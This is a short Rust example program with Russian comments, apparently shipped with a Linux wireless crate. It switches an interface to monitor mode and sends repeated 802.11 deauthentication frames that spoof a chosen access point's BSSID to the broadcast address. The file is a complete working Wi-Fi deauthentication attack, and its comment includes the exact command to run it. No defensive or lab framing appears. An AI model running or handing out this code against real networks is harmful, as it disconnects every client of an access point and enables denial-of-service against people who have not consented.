//! Отправляет кадры деаутентификации через monitor-интерфейс.
//!
//! Запуск (нужен root):
//!
//! ```text
//! cargo run --example raw_deauth -- wlan0 aa:bb:cc:dd:ee:ff 6
//! ```

use std::time::Duration;

use uu_linux_kernel_wlan::raw::{MacAddr, frame};
use uu_linux_kernel_wlan::{Error, Wlan};

fn usage() -> Error {
    Error::Message("usage: raw_deauth <ifname> <bssid> <channel>".to_string())
}

fn main() -> Result<(), Error> {
    let mut args = std::env::args().skip(1);
    let ifname = args.next().unwrap_or_else(|| "wlan0".to_string());
    let bssid: MacAddr = args.next().ok_or_else(usage)?.parse()?;
    let channel: u8 = args
        .next()
        .ok_or_else(usage)?
        .parse()
        .map_err(|_| Error::Message("channel must be 1..255".to_string()))?;

    let mut wlan = Wlan::open(&ifname)?;
    wlan.set_monitor()?;
    wlan.set_channel(channel)?;

    let frame = frame::deauthenticate(bssid, MacAddr::BROADCAST, frame::REASON_CLASS3_FRAME);
    println!(
        "sending {} bytes on {} channel {}",
        frame.len(),
        ifname,
        channel
    );

    for _ in 0..16 {
        wlan.send_frame(&frame)?;
        std::thread::sleep(Duration::from_millis(100));
    }
    Ok(())
}
